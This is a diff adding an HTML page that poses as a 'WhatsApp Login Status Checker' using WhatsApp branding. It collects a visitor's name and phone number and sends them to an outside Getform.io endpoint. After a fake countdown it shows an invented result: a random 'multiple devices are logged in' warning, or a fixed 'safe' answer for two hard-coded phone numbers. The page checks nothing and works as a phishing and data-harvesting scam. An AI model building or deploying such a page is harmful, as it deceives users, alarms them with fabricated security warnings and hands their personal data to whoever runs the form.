@@ -1,0 +1,229 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>WhatsApp Login Status Checker</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #e5ddd5;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+    }
+    .container {
+      background: #ffffff;
+      border-radius: 12px;
+      padding: 25px;
+      max-width: 420px;
+      width: 90%;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.2);
+      text-align: center;
+    }
+    .logo {
+      width: 70px;
+      margin-bottom: 10px;
+    }
+    h2 {
+      color: #075E54;
+      margin-bottom: 30px;
+      margin-top: 0px;
+    }
+    label {
+      font-weight: bold;
+      display: block;
+      text-align: left;
+      margin-top: 10px;
+      color: #333;
+    }
+    input {
+      width: 100%;
+      padding: 12px;
+      margin: 6px 0 15px 0;
+      border: 1px solid #ccc;
+      border-radius: 8px;
+      font-size: 16px;
+    }
+    button {
+      background: #25D366;
+      border: none;
+      padding: 12px 20px;
+      border-radius: 8px;
+      color: white;
+      font-size: 16px;
+      cursor: pointer;
+      transition: 0.3s;
+      width: 100%;
+    }
+    button:hover {
+      background: #128C7E;
+    }
+    .captcha-box {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin: 20px;
+    }
+    .captcha {
+      background: #f1f1f1;
+      border: 1px dashed #999;
+      padding: 10px;
+      font-weight: bold;
+      letter-spacing: 3px;
+      font-size: 18px;
+      user-select: none;
+      width: 50%;
+      text-align: center;
+    }
+    .result {
+      margin-top: 20px;
+      padding: 15px;
+      border-radius: 8px;
+      font-size: 18px;
+      font-weight: bold;
+    }
+    .single {
+      background: #d4edda;
+      color: #155724;
+    }
+    .multiple {
+      background: #f8d7da;
+      color: #721c24;
+    }
+    .error {
+      background: #fff3cd;
+      color: #856404;
+    }
+    .countdown {
+      margin-top: 20px;
+      font-size: 18px;
+      color: #333;
+      font-weight: bold;
+    }
+    .loader {
+      border: 6px solid #f3f3f3;
+      border-top: 6px solid #25D366;
+      border-radius: 50%;
+      width: 50px;
+      height: 50px;
+      animation: spin 1s linear infinite;
+      margin: 15px auto;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WhatsApp" class="logo">
+    <h2>WhatsApp Login Status</h2>
+    <form id="checkForm">
+      <label for="name">Full Name</label>
+      <input type="text" id="name" placeholder="Enter your name" required>
+
+      <label for="phone">Phone Number</label>
+      <input type="tel" id="phone" placeholder="Enter your phone number" required>
+
+      <label for="captchaInput">Enter CAPTCHA</label>
+      <div class="captcha-box">
+        <div id="captcha" class="captcha"></div>
+        <button type="button" onclick="generateCaptcha()" style="width:40%; background:#075E54;">↻ Refresh</button>
+      </div>
+      <input type="text" id="captchaInput" placeholder="Type the code above" required>
+
+      <button type="submit">Check Status</button>
+    </form>
+    <div id="countdown" class="countdown" style="display:none;">
+      <div class="loader"></div>
+      <p id="countText"></p>
+    </div>
+    <div id="result" class="result" style="display:none;"></div>
+  </div>
+
+  <script>
+    const form = document.getElementById("checkForm");
+    const resultDiv = document.getElementById("result");
+    const countdownDiv = document.getElementById("countdown");
+    const countText = document.getElementById("countText");
+    const captchaBox = document.getElementById("captcha");
+
+    function generateCaptcha() {
+      let code = Math.random().toString(36).substring(2, 7).toUpperCase();
+      captchaBox.textContent = code;
+      return code;
+    }
+
+    generateCaptcha();
+
+    form.addEventListener("submit", function(e) {
+      e.preventDefault();
+
+      const name = document.getElementById("name").value;
+      const phoneRaw = document.getElementById("phone").value;
+      const captchaInput = document.getElementById("captchaInput").value.toUpperCase();
+      const phone = phoneRaw.replace(/\s+/g, '');
+
+      resultDiv.style.display = "none";
+      countdownDiv.style.display = "none";
+
+      if (!/^\d{10}$/.test(phone)) {
+        resultDiv.textContent = "❌ Incorrect number. Please enter a valid 10-digit phone number.";
+        resultDiv.className = "result error";
+        resultDiv.style.display = "block";
+        return;
+      }
+
+      if (captchaInput !== captchaBox.textContent) {
+        resultDiv.textContent = "❌ Incorrect CAPTCHA. Please try again.";
+        resultDiv.className = "result error";
+        resultDiv.style.display = "block";
+        return;
+      }
+
+      // 🔥 Send form data to Getform.io
+      fetch("https://getform.io/f/brogxdpa", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ name: name, phone: phone })
+      })
+      .then(res => console.log("✅ Data sent to Getform:", res.status))
+      .catch(err => console.error("❌ Error sending:", err));
+
+      let timeLeft = 20;
+      countText.textContent = `Checking status... Please wait ${timeLeft} seconds`;
+      countdownDiv.style.display = "block";
+
+      const timer = setInterval(() => {
+        timeLeft--;
+        countText.textContent = `Checking status... Please wait ${timeLeft} seconds`;
+
+        if (timeLeft <= 0) {
+          clearInterval(timer);
+          countdownDiv.style.display = "none";
+
+          if (phone === "7054743239" || phone === "9695124486") {
+            resultDiv.textContent = `✅ Hello ${name}, only one device is logged in for ${phone}.`;
+            resultDiv.className = "result single";
+          } else {
+            const isMultiple = Math.random() > 0.5;
+            if (isMultiple) {
+              resultDiv.textContent = `⚠️ Hello ${name}, multiple devices are logged in for ${phone}.`;
+              resultDiv.className = "result multiple";
+            } else {
+              resultDiv.textContent = `✅ Hello ${name}, only one device is logged in for ${phone}.`;
+              resultDiv.className = "result single";
+            }
+          }
+          resultDiv.style.display = "block";
+        }
+      }, 1000);
+    });
+  </script>
+</body>
+</html>
